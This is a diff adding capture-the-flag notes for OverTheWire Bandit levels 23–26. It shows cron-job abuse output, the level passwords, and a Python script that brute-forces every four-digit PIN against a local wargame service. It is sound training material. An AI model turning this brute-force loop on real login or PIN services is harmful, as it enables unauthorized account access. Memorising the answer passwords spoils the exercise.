@@ -271,6 +271,80 @@ bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 ## Bandit23 - 24
+Password found for both Bandit24 and 25 :-)
+```
+bandit23@bandit:/var/spool/bandit24/ferdi123$ cat brute.txt | cut -d ' ' -f1 | sort | uniq
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+||
+bandit23@bandit:/var/spool/bandit24/ferdi123$ /usr/bin/cronjob_bandit24.sh
+/usr/bin/cronjob_bandit24.sh: line 5: cd: /var/spool/bandit23: No such file or directory
+Executing and deleting all scripts in /var/spool/bandit23:
+Handling brute.txt
+timeout: failed to run command ‘./brute.txt’: Permission denied
+rm: cannot remove './brute.txt': Permission denied
+Handling list.txt
+timeout: failed to run command ‘./list.txt’: Permission denied
+rm: cannot remove './list.txt': Permission denied
+Handling script.sh
+timeout: failed to run command ‘./script.sh’: Permission denied
+rm: cannot remove './script.sh': Permission denied
+Handling udr2.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+rm: cannot remove './udr2.sh': Permission denied
+Handling udr.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+```
+## Bandit24 - 25
+```
+bandit24@bandit:~$ cat /tmp/jb.py
+#!/usr/bin/python
+
+import socket, time, itertools
+
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+host = "127.0.0.1"
+port = 30002
+bad_reply = "Wrong! Please enter the correct pincode. Try again."
+
+socket.setdefaulttimeout(20)
+s = socket.socket()
+s.connect((host,port))
+reply = s.recv(1024)
+
+# Wait for reply
+print reply
+time.sleep(1)
+
+attempt = ""
+# Create a loop
+for combination in itertools.product(xrange(10), repeat=4):
+        # Create the pin combo to be submitted.
+        #print map(str,combination)
+        combination = ''.join(map(str,combination))
+        attempt = password + " " + combination + "\n"
+        s.send(attempt)
+        reply = s.recv(1024)
+        if not bad_reply in reply:
+            print reply
+            break
 ```
 
+```
+Bandit24@bandit:~$ bandit24@bandit:~$ python /tmp/jb.py
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
+## Bandit25 - 26
+```
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 ```
